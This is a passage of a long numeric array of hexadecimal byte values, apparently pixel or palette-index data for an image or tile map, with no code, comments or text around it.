0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x07,
0x18, 0x17, 0x18, 0x19, 0x07, 0x1B, 0x1B, 0x1B, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x19, 0x07, 0x07, 0x1B, 0x07, 0x07,
0x07, 0x07, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x17, 0x86, 0xE5, 0xCD, 0xCD, 0xCD, 0xCE, 0xCE, 0xCF, 0xE5, 0x9E,
0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x16, 0x16, 0x08,
0x08, 0x9A, 0x08, 0x9A, 0x9F, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x99, 0x99, 0x99, 0x99, 0x9A, 0x9A, 0x16,
0x16, 0x9B, 0x9B, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x08, 0x14, 0x14, 0x14, 0x14,
0x08, 0x08, 0x08, 0x9E, 0x16, 0x16, 0x16, 0x16, 0x9E, 0x9E, 0x9E, 0x9D, 0x9C, 0x9C, 0x17, 0x17,
0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17,
0x17, 0x17, 0x18, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1E, 0x0F, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x0F, 0x1E, 0x1D, 0x1C, 0x1B, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1C,
0x18, 0x80, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0x80, 0x80, 0x80, 0xDD,
0xDE, 0xDE, 0xDF, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x07, 0x18,
0x18, 0x19, 0x1B, 0x1B, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19,
0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x17, 0x17, 0x9D, 0x9D, 0x85, 0x87, 0xE5, 0xE4, 0xE4, 0xCD, 0xCE, 0xCF, 0xCF, 0xCD, 0x9F, 0x9D,
0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9F, 0x86, 0x08, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08,
0x08, 0x08, 0x08, 0x9A, 0x9A, 0x16, 0x16, 0x16, 0x16, 0x16, 0x9A, 0x9A, 0x16, 0x16, 0x16, 0x9B,
0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17, 0x08, 0x08, 0x08, 0x08, 0x08,
0x9E, 0x16, 0x16, 0x16, 0x16, 0x9E, 0x9E, 0x9D, 0x9E, 0x9E, 0x9E, 0x9D, 0x9C, 0x17, 0x17, 0x18,
0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C,
0x1B, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1C, 0x1B,
0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x19, 0x98, 0xDF, 0xDE, 0xDE, 0xDF, 0xDF, 0xDF, 0xDF, 0xDE, 0xDF, 0xDE, 0xDE, 0xDE, 0xDF,
0xDF, 0xDF, 0xDF, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x19, 0x18, 0x9C, 0x9D, 0x9D, 0x9C, 0x17, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x86, 0x86,
0x86, 0x86, 0x87, 0x87, 0xCD, 0xCE, 0xCD, 0xCD, 0xCD, 0xCD, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCD,
0xCD, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0xE8, 0xE5,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x99, 0x9A, 0x9A, 0x16, 0x9A, 0x9B,
0x9B, 0x9B, 0x9B, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x9C, 0x16, 0x16, 0x16, 0x9A, 0x9A,
0x16, 0x9D, 0x9C, 0x9C, 0x9D, 0x9F, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9D, 0x17, 0x17, 0x18,
0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C,
0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1B, 0x17, 0xF6, 0xE0, 0xE0, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF,
0xDF, 0xDF, 0xDF, 0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C,
0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x18, 0x9D, 0x9D, 0x9C, 0x17, 0x9E, 0xE5, 0xCE, 0xCE, 0xCE, 0xCF, 0xCF, 0xCE, 0xCE, 0xCE,
0xCE, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xB6, 0xB6, 0xB6, 0xCE,
0xCD, 0xCD, 0xCD, 0xCD, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE,
0xCD, 0xCD, 0xCE, 0xCE, 0xCE, 0xCF, 0xCF, 0xCF, 0xCF, 0xCE, 0xCE, 0xE7, 0xE5, 0xE5, 0xE7, 0xE8,
0xE7, 0xE5, 0xE5, 0xEB, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x14, 0x14, 0x08, 0x08, 0x08, 0x99, 0x99, 0x9A, 0x9A,
0x9A, 0x9A, 0x9B, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x17, 0x16, 0x9E, 0x9A, 0x9A, 0x9E, 0x9E,
0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x08, 0xE4, 0xE4, 0x14, 0x08, 0x9D, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x18, 0x18, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1C, 0x1B, 0x17, 0x80, 0xE0, 0xF7, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDF, 0xDF,
0xDF, 0xDF, 0xDF, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x52,
0x52, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x19, 0x18, 0x17, 0x9D, 0x9E, 0x86, 0x87, 0xE4, 0xE4, 0xE4, 0xE5, 0xCD, 0xCD, 0xCD, 0xCE,
0xCE, 0xCF, 0xCF, 0xCF, 0xB6, 0xB6, 0xB6, 0xB7, 0xB7, 0xB6, 0xB6, 0xCF, 0xCE, 0xCE, 0xCD, 0xCD,
0xCD, 0xCE, 0xCE, 0xCF, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0xCD, 0xCD, 0xE5,
0xE5, 0xCD, 0xCE, 0xCF, 0xD0, 0xCF, 0xD0, 0xD0, 0xD0, 0xD0, 0xCF, 0xD0, 0xCF, 0xCF, 0xE8, 0xCF,
0xCF, 0xE8, 0xE8, 0xE7, 0xE8, 0xE7, 0xEA, 0xEA, 0xEA, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6,
0xE6, 0xE5, 0xE5, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x99, 0x9A, 0x9B, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9B, 0x16, 0x9D, 0x9C, 0x9C, 0x9C, 0x17,
0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x17, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1E, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E,
0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x19, 0x14, 0x12, 0xC8, 0xC8, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF,
0xDF, 0xDF, 0xDF, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19,
0x18, 0x18, 0x18, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x9C,
0x9D, 0x9E, 0x9E, 0x9E, 0x9F, 0x86, 0x86, 0x87, 0x87, 0x87, 0x88, 0x88, 0x88, 0xE5, 0xCD, 0xCE,
0xCF, 0xB6, 0xB6, 0xB6, 0xB6, 0xB6, 0xB6, 0xCF, 0xCF, 0xCF, 0xB6, 0xB6, 0xB6, 0xB6, 0xD0, 0xD0,
0xD0, 0xD0, 0xD0, 0xD0, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xE8, 0xE8, 0xE7, 0xE6, 0xE6, 0xE6, 0xE7,
0xE7, 0xE7, 0xE7, 0xE9, 0xE7, 0xE7, 0xE7, 0xE7, 0xE9, 0xEA, 0xEA, 0xEA, 0xE7, 0xE9, 0xE9, 0xE8,
0xCF, 0xE8, 0xE6, 0xE5, 0x14, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08,
0x08, 0x9A, 0x16, 0x16, 0x17, 0x17, 0x17, 0x9C, 0x9A, 0x08, 0x14, 0x08, 0x9E, 0x9D, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x18, 0x17, 0x18, 0x17, 0x9D, 0x9E, 0x9F, 0x9E, 0x9D, 0x17, 0x17, 0x17, 0x18,
0x19, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1B,
0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E,
0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1E, 0x1C, 0x9B, 0x12, 0x11, 0x11, 0xB1, 0xC8, 0xDF, 0xDF, 0xDF,
0xC8, 0xC8, 0xC8, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07,
0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x19, 0x19, 0x18, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x9C,
0x9D, 0x9E, 0x9E, 0x9E, 0x9F, 0x86, 0x87, 0x87, 0xE5, 0xE5, 0xE5, 0xCD, 0xCD, 0xCE, 0xCF, 0xD0,
0xB6, 0xB7, 0xB7, 0xB7, 0xB7, 0xB7, 0xD0, 0xCE, 0xE6, 0xCE, 0xCF, 0xD0, 0xB6, 0xD0, 0xD0, 0xCF,
0xCF, 0xCF, 0xCE, 0xE8, 0xE8, 0xE8, 0xE7, 0xE7, 0xE7, 0xE7, 0xE7, 0xE8, 0xE8, 0xE8, 0xE8, 0xCF,
0xCF, 0xE8, 0xE7, 0xE9, 0xE8, 0xE8, 0xE8, 0xE7, 0xE6, 0x14, 0x14, 0xEB, 0xEA, 0xE7, 0xE8, 0xE7,
0xE6, 0xE6, 0xE5, 0x14, 0x08, 0x9F, 0x08, 0x08, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x16, 0x9C, 0x17, 0x9C, 0x16, 0x9C, 0x9C, 0x9B, 0x16, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C,
0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17, 0x9C, 0x9E, 0x08, 0x08, 0x08, 0x08, 0x08, 0x9E,
0x17, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1C,
0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E,
0x1E, 0x1E, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x0F, 0x1E,
0x1E, 0x0F, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1E, 0x1D, 0x18, 0xE3, 0x11, 0x11, 0x11, 0x11, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x19, 0x19, 0x9C, 0x9F, 0x08, 0x14, 0x08, 0x9F, 0x9D, 0x17, 0x17, 0x17, 0x17,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x9C, 0x9E,
0x86, 0x87, 0x87, 0x87, 0xE4, 0xE5, 0xCD, 0xCE, 0xCE, 0xCF, 0xCF, 0xD0, 0xD0, 0xD0, 0xD0, 0xD0,
0xD0, 0xD0, 0xCF, 0xCF, 0xCF, 0xCF, 0xCE, 0xCE, 0xCE, 0xE6, 0xE6, 0xCE, 0xCE, 0xCF, 0xCF, 0xE7,
0xE6, 0xE5, 0xE6, 0xE5, 0xE5, 0xE5, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE7, 0xE8, 0xE8, 0xE7,
0xE6, 0xE7, 0xE8, 0xCF, 0xE8, 0xE7, 0xE6, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE5, 0xE6, 0xE6, 0xE6,
0xE5, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE5, 0xE4, 0x08, 0x9E, 0x9D, 0x9E, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x17, 0x9A, 0x08, 0x9A, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x18, 0x17, 0x17, 0x17,
0x17, 0x17, 0x18, 0x18, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x18, 0x18, 0x19, 0x19,
0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x07,
0x07, 0x1B, 0x07, 0x19, 0x19, 0x19, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C,
0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x0F, 0x1E, 0x1E, 0x1E, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1B, 0x08, 0x11, 0x11, 0x11, 0x12, 0xC8,
0xC8, 0xC8, 0xC8, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x9C, 0x9E, 0x86, 0x86, 0x86, 0x87, 0xE4, 0xE5,
0xE5, 0xE6, 0xE6, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xE8, 0xE6, 0xE5,
